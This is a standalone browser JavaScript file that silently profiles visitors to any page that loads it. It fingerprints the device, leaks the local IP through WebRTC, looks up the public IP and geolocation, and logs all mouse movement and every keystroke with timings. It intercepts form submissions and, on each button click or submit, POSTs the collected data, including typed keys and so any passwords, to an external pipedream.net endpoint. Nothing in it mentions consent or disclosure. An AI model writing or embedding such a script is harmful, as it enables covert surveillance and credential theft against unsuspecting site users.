(async function () {
    // 🖥️ Get Device Details
    function getDeviceDetails() {
      let userAgent = navigator.userAgent;
      let browser = "Unknown";
      let os = "Unknown";
  
      // Detect Browser
      if (userAgent.includes("Firefox")) {
        browser = "Firefox";
      } else if (userAgent.includes("Edg")) {
        browser = "Microsoft Edge";
      } else if (userAgent.includes("Brave")) {
        browser = "Brave";
      } else if (userAgent.includes("Chrome")) {
        browser = "Chrome";
      } else if (userAgent.includes("Safari")) {
        browser = "Safari";
      } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        browser = "Opera";
      }
  
      // Detect OS
      if (userAgent.includes("Win")) {
        os = "Windows";
      } else if (userAgent.includes("Mac")) {
        os = "MacOS";
      } else if (userAgent.includes("X11") || userAgent.includes("Linux")) {
        os = "Linux";
      } else if (/Android/.test(userAgent)) {
        os = "Android";
      } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        os = "iOS";
      }
  
      return {
        userAgent: userAgent,
        browser: browser,
        os: os,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        deviceMemory: navigator.deviceMemory || "Unknown",
        cpuCores: navigator.hardwareConcurrency || "Unknown",
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      };
    }
  
    // 🌐 Get Public IP
    async function getPublicIP() {
      try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        return data.ip;
      } catch {
        return "Unknown";
      }
    }
  
    // 📶 Get Local IP (WebRTC)
    function getLocalIP() {
      return new Promise((resolve) => {
        let pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer()
          .then((offer) => pc.setLocalDescription(offer))
          .catch(() => {});
        pc.onicecandidate = (event) => {
          if (event && event.candidate) {
            let localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
            resolve(localIP ? localIP[1] : "Unknown");
            pc.close();
          }
        };
      });
    }
  
    // 📍 Get Location
    async function getGeoDetails() {
      try {
        let response = await fetch("http://ip-api.com/json/");
        let data = await response.json();
        return {
          city: data.city,
          region: data.regionName,
          country: data.country,
          latitude: data.lat,
          longitude: data.lon,
          isp: data.isp,
        };
      } catch {
        return { city: "Unknown", country: "Unknown" };
      }
    }
  
    // 🎯 Mouse & Keyboard Activity Tracking
    let mouseData = [];
    document.addEventListener("mousemove", (e) => {
      mouseData.push({ x: e.clientX, y: e.clientY });
    });
    document.addEventListener("click", (e) => {
      mouseData.push({ type: "click", button: e.button, x: e.clientX, y: e.clientY });
    });
    document.addEventListener("scroll", () => {
      mouseData.push({ type: "scroll", x: window.scrollX, y: window.scrollY });
    });
  
    let keyboardData = [];
    document.addEventListener("keydown", (e) => {
      let startTime = Date.now();
      keyboardData.push({ key: e.key, startTime });
    });
    document.addEventListener("keyup", (e) => {
      let endTime = Date.now();
      let keyData = keyboardData.find((k) => k.key === e.key && !k.endTime);
      if (keyData) {
        keyData.endTime = endTime;
        keyData.holdTime = endTime - keyData.startTime;
      }
    });
  
    // 🚀 Send System Data
    async function sendSystemData(clickedButton) {
      let deviceDetails = getDeviceDetails();
      let publicIP = await getPublicIP();
      let localIP = await getLocalIP();
      let geoDetails = await getGeoDetails();
  
      let systemData = {
        ...deviceDetails,
        publicIP,
        localIP,
        ...geoDetails,
        mouseData,
        keyboardData,
        clickedButton,
      };
  
      console.log("Collected System Data:", systemData);
  
      fetch("https://700bebc8a052541caf0ff9e5de2c58bc.m.pipedream.net", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(systemData),
      })
        .then((res) => res.json())
        .then((data) => console.log("Data sent successfully:", data))
        .catch((err) => console.error("Error sending data:", err));
    }
  
    // ⏹️ Track Clicks on Any <button> Tag
    document.addEventListener("click", async function (event) {
      if (event.target.tagName === "BUTTON") {
        let buttonType = event.target.type || "button";
        await sendSystemData(`[${buttonType}] ${event.target.innerText || "Unnamed Button"}`);
      }
    });
  
    // ⏹️ Track Clicks on PrimeReact Buttons
    function patchPrimeReactButton() {
      let observer = new MutationObserver(() => {
        document.querySelectorAll(".p-button").forEach((btn) => {
          if (!btn.dataset.tracked) {
            btn.dataset.tracked = "true";
            btn.addEventListener("click", async function () {
              await sendSystemData(`[PrimeReact] ${btn.innerText || "Button"}`);
            });
          }
        });
      });
  
      observer.observe(document.body, { childList: true, subtree: true });
    }
  
    patchPrimeReactButton();
  
    // ⏹️ Track Form Submissions (Submit Buttons)
    document.addEventListener("submit", async function (event) {
      event.preventDefault(); // Prevent default for testing (remove this later)
      let submitButton = event.submitter ? event.submitter.innerText : "Form Submitted";
      await sendSystemData(`[Submit] ${submitButton}`);
      event.target.submit(); // Manually submit after tracking (if needed)
    });
  
  })();
  